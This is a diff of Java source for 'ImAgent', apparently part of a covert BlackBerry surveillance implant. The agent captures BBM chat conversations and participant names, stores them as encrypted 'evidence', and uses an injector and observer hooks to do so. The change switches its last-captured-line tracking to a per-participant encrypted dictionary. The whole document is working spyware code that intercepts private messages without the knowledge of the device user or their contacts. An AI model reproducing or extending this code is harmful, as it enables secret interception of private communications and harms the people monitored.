@@ -9,7 +9,6 @@
  * *************************************************/
 package blackberry.agent;
 
-import java.io.IOException;
 import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
@@ -20,8 +19,8 @@ import blackberry.config.Conf;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.DictMarkup;
 import blackberry.evidence.Evidence;
-import blackberry.evidence.Markup;
 import blackberry.injection.AppInjector;
 import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
@@ -46,8 +45,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
 
     String appName = "Messenger";
 
-    Line lastLine;
-    Markup markup;
+    DictMarkup markup;
 
     /**
      * Instantiates a new task agents
@@ -79,36 +77,28 @@ public final class ImAgent extends Agent implements BacklightObserver,
         setPeriod(APP_TIMER_PERIOD);
         setDelay(APP_TIMER_PERIOD);
 
-        markup = new Markup(agentId, Encryption.getKeys().getAesKey());
-        lastLine = unserialize();
+        markup = new DictMarkup(agentId, Encryption.getKeys().getAesKey());
+       
     }
 
-    private Line unserialize() {
+    private Line unserialize(String partecipants) {
         //#ifdef DEBUG
         debug.trace("unserialize");
         //#endif
         if (markup.isMarkup()) {
-            try {
-                byte[] data = markup.readMarkup();
-
-                //#ifdef DEBUG
-                debug.trace("unserialize: " + Utils.byteArrayToHex(data));
-                //#endif
-
-                lastLine = Line.unserialize(data);
+            
+                byte[] lineSer = markup.get(partecipants);
+                Line lastLine = Line.unserialize(lineSer);
                 //#ifdef DEBUG
                 debug.trace("unserialize: " + lastLine);
                 //#endif
-            } catch (IOException e) {
-                //#ifdef DEBUG
-                debug.error("unserialize: " + e);
-                //#endif
-            }
+                return lastLine;
+           
         }
         return null;
     }
 
-    private void serialize(Line lastLine) {
+    private void serialize(String partecipants, Line lastLine) {
         //#ifdef DEBUG
         debug.trace("serialize: " + lastLine);
         //#endif
@@ -123,7 +113,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
             markup.createEmptyMarkup();
         }
 
-        markup.writeMarkup(data);
+        markup.put(partecipants, data);
     }
 
     public static ImAgent getInstance() {
@@ -248,6 +238,8 @@ public final class ImAgent extends Agent implements BacklightObserver,
         Check.asserts(lines != null, "null lines");
         //#endif
 
+        Line lastLine = unserialize(partecipants);
+        
         if (lines.lastElement().equals(lastLine)) {
             //#ifdef DEBUG
             debug.trace("add: nothing new");
@@ -278,7 +270,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
             debug.trace("add, serialize lastLine: " + lastLine);
             //#endif
 
-            serialize(lastLine);
+            serialize(partecipants, lastLine);
             writeEvidence(partecipants, lines, lastEqual + 1);
 
             //#ifdef DEBUG
@@ -303,7 +295,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         //#endif
 
         String imname = "BBM";
-        String topic = "chat";
+        String topic = "";
         String users = partecipants;
 
         DateTime datetime = new DateTime();
